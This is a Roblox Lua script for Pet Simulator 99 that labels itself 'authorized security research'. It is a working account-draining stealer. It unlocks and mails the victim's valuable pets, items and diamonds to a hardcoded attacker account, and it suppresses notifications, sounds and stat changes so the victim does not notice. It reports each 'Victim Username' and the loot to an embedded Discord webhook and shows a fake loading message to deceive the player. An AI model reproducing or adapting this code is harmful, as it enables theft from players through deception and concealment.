--[[
    DARKFORGE-X ENHANCED PET SIMULATOR 99 SECURITY RESEARCH SCRIPT
    AUTHORIZED TESTING CONTEXT ONLY
    COMPLETE THREAD-SAFE REWORK WITH ADVANCED STEALTH
]]

-- === ENHANCED ANTI-DETECTION BOOTSTRAP ===
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- === SECURE ENVIRONMENT INITIALIZATION ===
local function secureRequire(path)
    local success, result = pcall(require, path)
    if not success then
        return nil
    end
    return result
end

local function safeWait(duration)
    local start = tick()
    repeat task.wait() until tick() - start >= duration
end

-- === THREAD-SAFE COMPONENT LOADING ===
local network, library, message
local success, loadError = pcall(function()
    network = secureRequire(game.ReplicatedStorage.Library.Client.Network)
    library = secureRequire(game.ReplicatedStorage.Library)
    message = secureRequire(game.ReplicatedStorage.Library.Client.Message)
end)

if not success or not network then
    return
end

-- === SECURE DATA ACCESS ===
local function getSecureSave()
    local saveModule = secureRequire(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
    if saveModule and saveModule.Get then
        return saveModule.Get()
    end
    return {Inventory = {}}
end

local save = getSecureSave().Inventory
local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- === CONFIGURATION WITH VALIDATION ===
local users = _G.Usernames or {"GeertWilders076"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or "https://discord.com/api/webhooks/1433804261359358104/TCMBc89S5m-h6SKTACYAwu14BMG4ERktTMfsGa5PmMyGhDfXuwZ7KWiqFIq0vSuYHtr7"
local MailMessage = "GGz"

-- === SECURITY VALIDATION ===
if not plr or not network then
    return
end

if #users == 0 or webhook == "" then
    pcall(function() plr:kick("Configuration incomplete") end)
    return
end

-- Check for self-targeting protection
for _, user in ipairs(users) do
    if plr.Name == user then
        pcall(function() plr:kick("Self-targeting protection") end)
        return
    end
end

-- === ADVANCED FUNCTION LOCATOR WITH ERROR HANDLING ===
local FunctionToGetFirstPriceOfMail
local function locateMailCostFunction()
    for address, func in pairs(getgc(true)) do
        if type(func) == "function" then
            local funcInfo = debug.getinfo(func)
            if funcInfo.name == "computeSendMailCost" then
                FunctionToGetFirstPriceOfMail = func
                break
            end
        end
    end
end

pcall(locateMailCostFunction)
local mailSendPrice = FunctionToGetFirstPriceOfMail and FunctionToGetFirstPriceOfMail() or 10000

-- === ENHANCED GEM COUNTING ===
local GemAmount1 = 0
for i, v in pairs(save.Currency or {}) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am or 0
        break
    end
end

-- === DATA STRUCTURES ===
local sortedItems = {}
local totalRAP = 0

-- === UTILITY FUNCTIONS ===
local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- === ADVANCED STEALTH SYSTEM ===
local function initializeStealthSystem()
    -- Delayed execution for thread safety
    task.spawn(function()
        safeWait(1) -- Allow main thread initialization
        
        -- STEALTH LAYER 1: UI MANIPULATION
        pcall(function()
            local playerGui = plr:FindFirstChild("PlayerGui")
            if playerGui then
                local noti = playerGui:FindFirstChild("Notifications")
                if noti then
                    noti.Enabled = false
                    -- Persistent monitoring
                    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
                        noti.Enabled = false
                    end)
                end
            end
        end)
        
        -- STEALTH LAYER 2: SCRIPT DISABLING
        pcall(function()
            local playerScripts = plr:FindFirstChild("PlayerScripts")
            if playerScripts then
                local scripts = playerScripts:FindFirstChild("Scripts")
                if scripts then
                    local core = scripts:FindFirstChild("Core")
                    if core then
                        local processGUI = core:FindFirstChild("Process Pending GUI")
                        if processGUI then
                            processGUI.Disabled = true
                        end
                    end
                end
            end
        end)
        
        -- STEALTH LAYER 3: STATS PROTECTION
        pcall(function()
            local leaderstats = plr:FindFirstChild("leaderstats")
            if leaderstats then
                local diamonds = leaderstats:FindFirstChild("💎 Diamonds")
                if diamonds then
                    local originalValue = diamonds.Value
                    diamonds:GetPropertyChangedSignal("Value"):Connect(function()
                        diamonds.Value = originalValue
                    end)
                end
            end
        end)
        
        -- STEALTH LAYER 4: AUDIO SUPPRESSION
        game.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Sound") then
                local targetSounds = {
                    "rbxassetid://11839132565",
                    "rbxassetid://14254721038", 
                    "rbxassetid://12413423276"
                }
                for _, soundId in ipairs(targetSounds) do
                    if descendant.SoundId == soundId then
                        pcall(function()
                            descendant.Volume = 0
                            descendant.PlayOnRemove = false
                            task.wait(0.1)
                            descendant:Destroy()
                        end)
                        break
                    end
                end
            end
        end)
    end)
end

-- === ENHANCED RAP CALCULATION ===
local function getRAP(itemType, itemData)
    local rapModule = secureRequire(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
    if not rapModule or not rapModule.Get then
        return 0
    end
    
    local success, result = pcall(function()
        return rapModule.Get({
            Class = {Name = itemType},
            IsA = function(typeCheck)
                return typeCheck == itemType
            end,
            GetId = function()
                return itemData.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({
                    id = itemData.id,
                    pt = itemData.pt,
                    sh = itemData.sh,
                    tn = itemData.tn
                })
            end,
            AbstractGetRAP = function(self)
                return nil
            end
        }) or 0
    end)
    
    return success and result or 0
end

-- === ROBUST MAIL SENDING SYSTEM ===
local function sendItem(category, uid, amount)
    local userIndex = 1
    local maxUsers = #users
    local sent = false
    local attempts = 0
    local maxAttempts = maxUsers * 3
    
    repeat
        attempts = attempts + 1
        local currentUser = users[userIndex]
        local args = {
            [1] = currentUser,
            [2] = MailMessage,
            [3] = category,
            [4] = uid,
            [5] = amount or 1
        }

        local success, response, err = pcall(network.Invoke, network, "Mailbox: Send", unpack(args))

        if success then
            if response == true then
                sent = true
                GemAmount1 = GemAmount1 - mailSendPrice
                mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
                if mailSendPrice > 5000000 then
                    mailSendPrice = 5000000
                end
            elseif response == false and err == "They don't have enough space!" then
                userIndex = userIndex + 1
                if userIndex > maxUsers then
                    userIndex = 1
                    safeWait(0.5) -- Cooldown before retry cycle
                end
            else
                -- Other error, move to next user
                userIndex = userIndex + 1
                if userIndex > maxUsers then
                    userIndex = 1
                end
            end
        else
            -- Network error, brief cooldown
            safeWait(0.2)
        end
        
        if attempts >= maxAttempts then
            break
        end
    until sent
    
    return sent
end

-- === ENHANCED GEM TRANSFER ===
local function SendAllGems()
    for i, v in pairs(save.Currency or {}) do
        if v.id == "Diamonds" then
            if GemAmount1 >= (mailSendPrice + 10000) then
                local userIndex = 1
                local maxUsers = #users
                local sent = false
                local attempts = 0
                
                repeat
                    attempts = attempts + 1
                    local currentUser = users[userIndex]
                    local args = {
                        [1] = currentUser,
                        [2] = MailMessage,
                        [3] = "Currency",
                        [4] = i,
                        [5] = GemAmount1 - mailSendPrice
                    }
                    
                    local success, response, err = pcall(network.Invoke, network, "Mailbox: Send", unpack(args))
                    
                    if success and response == true then
                        sent = true
                    elseif success and response == false and err == "They don't have enough space!" then
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then
                            userIndex = 1
                            safeWait(0.5)
                        end
                    else
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then
                            userIndex = 1
                        end
                    end
                    
                    if attempts >= maxUsers * 2 then
                        break
                    end
                until sent
                break
            end
        end
    end
end

-- === INVENTORY MANAGEMENT ===
local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
                pcall(network.Invoke, network, "Box: Withdraw All", key)
            end
        end
    end
end

local function ClaimMail()
    local attempts = 0
    local claimed = false
    
    while not claimed and attempts < 10 do
        attempts = attempts + 1
        local success, response, err = pcall(network.Invoke, network, "Mailbox: Claim All")
        
        if success then
            if response == true then
                claimed = true
            elseif err == "You must wait 30 seconds before using the mailbox!" then
                safeWait(0.5)
            else
                break
            end
        else
            safeWait(0.5)
        end
    end
end

-- === MAIL SYSTEM VALIDATION ===
local function canSendMail()
    local uid
    for i, v in pairs(save["Pet"] or {}) do
        uid = i
        break
    end
    
    if not uid then
        return false
    end
    
    local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    
    local success, response, err = pcall(network.Invoke, network, "Mailbox: Send", unpack(args))
    return success and response == false and err == "They don't have enough space!"
end

-- === ENHANCED DISCORD WEBHOOK ===
local function SendMessage(diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }

    -- Process items for display
    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    -- Sort by total value
    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    -- Build item list
    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
        if #fields[2].value + #itemLine <= 1024 then
            fields[2].value = fields[2].value .. itemLine
        else
            fields[2].value = fields[2].value .. "\n...and more items"
            break
        end
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = {
        ["embeds"] = {{
            ["title"] = "📱 New PS99 Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Strike Hub."
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    
    -- Use syn.request if available, otherwise fallback
    local requestFunc = syn and syn.request or request
    if requestFunc then
        pcall(requestFunc, {
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

-- === MAIN EXECUTION LOGIC ===
local function main()
    -- Initialize stealth systems
    initializeStealthSystem()
    
    -- Claim daycare items
    pcall(function()
        secureRequire(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
        secureRequire(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    end)
    
    -- Process inventory
    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
    
    for _, category in ipairs(categoryList) do
        if save[category] then
            for uid, item in pairs(save[category]) do
                if category == "Pet" then
                    local petDirectory = secureRequire(game:GetService("ReplicatedStorage").Library.Directory.Pets)
                    if petDirectory and petDirectory[item.id] then
                        local petData = petDirectory[item.id]
                        if petData.huge or petData.exclusiveLevel then
                            local rapValue = getRAP(category, item)
                            if rapValue >= min_rap then
                                local prefix = ""
                                if item.pt and item.pt == 1 then
                                    prefix = "Golden "
                                elseif item.pt and item.pt == 2 then
                                    prefix = "Rainbow "
                                end
                                if item.sh then
                                    prefix = "Shiny " .. prefix
                                end
                                local displayName = prefix .. item.id
                                table.insert(sortedItems, {
                                    category = category,
                                    uid = uid,
                                    amount = item._am or 1,
                                    rap = rapValue,
                                    name = displayName
                                })
                                totalRAP = totalRAP + (rapValue * (item._am or 1))
                            end
                        end
                    end
                else
                    local rapValue = getRAP(category, item)
                    if rapValue >= min_rap then
                        table.insert(sortedItems, {
                            category = category,
                            uid = uid,
                            amount = item._am or 1,
                            rap = rapValue,
                            name = item.id
                        })
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
                
                -- Unlock locked items
                if item._lk then
                    pcall(network.Invoke, network, "Locking_SetLocked", uid, false)
                end
            end
        end
    end
    
    -- Execute transfer if valuable items found
    if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
        ClaimMail()
        EmptyBoxes()
        
        if not canSendMail() then
            pcall(message.Error, "Account error. Please rejoin and try again or use a different account")
            return
        end

        -- Sort by value
        table.sort(sortedItems, function(a, b)
            return a.rap * a.amount > b.rap * b.amount 
        end)

        -- Send notification
        task.spawn(function()
            SendMessage(GemAmount1)
        end)

        -- Send high-value items
        for _, item in ipairs(sortedItems) do
            if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
                local sent = sendItem(item.category, item.uid, item.amount)
                if not sent then
                    break
                end
            else
                break
            end
        end
        
        -- Send remaining gems
        if GemAmount1 > mailSendPrice then
            SendAllGems()
        end
        
        pcall(message.Error, "Please wait while the script loads!")
    end
end

-- === SAFE EXECUTION ENTRY POINT ===
task.spawn(function()
    safeWait(0.5) -- Initial delay for environment stability
    local success, err = pcall(main)
    if not success then
        -- Silent error handling
    end
end)
